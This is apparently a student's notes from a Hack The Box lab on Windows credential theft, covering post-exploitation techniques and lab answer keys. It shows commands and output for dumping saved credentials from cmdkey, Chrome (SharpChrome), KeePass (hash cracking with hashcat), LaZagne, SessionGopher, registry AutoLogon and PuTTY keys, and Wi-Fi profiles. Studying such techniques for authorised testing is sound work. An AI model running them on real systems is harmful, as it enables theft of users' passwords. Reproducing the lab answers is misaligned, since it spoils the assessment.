# Further Credential Theft

## Cmdkey Saved Credentials

**Listing Saved Credentials**

```cmd-session
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
	
```

When we attempt to RDP to the host, the saved credentials will be used.

![image](https://academy.hackthebox.com/storage/modules/67/cmdkey\_rdp.png)

We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

**Run Commands as Another User**

```powershell-session
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

## Browser Credentials

**Retrieving Saved Credentials from Chrome**

```powershell-session
PS C:\htb> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1
```

## Password Managers

**Extracting KeePass Hash**

```shell-session
python keepass2john.py ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

**Cracking Hash Offline**

```shell-session
hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

## Email

search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool

{% embed url="https://github.com/dafthack/MailSniper" %}
tool for searching through email in a Microsoft Exchange environment
{% endembed %}

## Other methods

**Running All LaZagne Modules**

{% embed url="https://github.com/AlessandroZ/LaZagne" %}
open source application used to **retrieve lots of passwords** stored on a local computer
{% endembed %}

```powershell-session
PS C:\htb> .\lazagne.exe all
```

**Running SessionGopher as Current User**

{% embed url="https://github.com/Arvanaghi/SessionGopher" %}
PowerShell tool that finds and decrypts saved session information for remote access tools.
{% endembed %}

```powershell-session
PS C:\htb> Import-Module .\SessionGopher.ps1
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```

## Clear-Text Password Storage in the Registry

### Windows AutoLogon

a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account.

registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

**Enumerating Autologon with reg.exe**

```cmd-session
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

### Putty

the credentials are stored in the registry in clear text.

```cmd
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

**Enumerating Sessions and Finding Credentials:**

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!  
```

## Wifi Passwords

**Viewing Saved Wireless Networks**

```cmd-session
C:\htb> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

**Retrieving Saved Wireless Passwords**

```cmd-session
C:\htb> netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```

## Assessment

<details>

<summary>Using the techniques covered in this section, retrieve the sa password for the SQL01.inlanefreight.local user account.</summary>

```
PS C:\Tools> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Dbvis passwords -----------------

[+] Password found !!!
Name: SQL01.inlanefreight.local
Driver:
          SQL Server (Microsoft JDBC Driver)

Host: localhost
Login: sa
Password: S3cret_db_p@ssw0rd!
Port: 1433


[+] 2 passwords have been found.
```

<pre><code><strong>sa:S3cret_db_p@ssw0rd!
</strong></code></pre>

</details>

<details>

<summary>Which user has credentials stored for RDP access to the WEB01 host?</summary>

```
C:\Users\htb-student>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02oiyrkaiseq
    Local machine persistence

    Target: Domain:target=WEB01
    Type: Domain Password
    User: amanda
```

```
User:amanda
```

</details>

<details>

<summary>Find and submit the password for the root user to access https://vc01.inlanefreight.local/ui/login</summary>

```
PS C:\Tools> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.11.1


[*] Action: Chrome Saved Logins Triage


[*] Triaging Chrome Logins for current user


[*] AES state key file : C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : D72790F4972C4D5700D8D2ED50D21850A3429373534ED938EB009219A51A0479

[X] Error : 0

---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc.inlanefreight.local/,https://vc
.inlanefreight.local/ui/login,5/26/2021 12:09:51 PM,13266529791618996,root,"?U?1`?l}?????A
?"
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http:
//vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,ILVCadm1n1qazZAQ!
```

```
root:ILVCadm1n1qazZAQ!
```

</details>

<details>

<summary>Enumerate the host and find the password for ftp.ilfreight.local</summary>

```
PS C:\Tools> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: htb-student ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: ftp.ilfreight.local
Login: root
Password: Ftpuser!
Port: 22

------------------- Vault passwords -----------------

[-] Password not found !!!
URL: Domain:target=WEB01
Login: amanda
```

<pre><code><strong>root:Ftpuser!
</strong></code></pre>

</details>
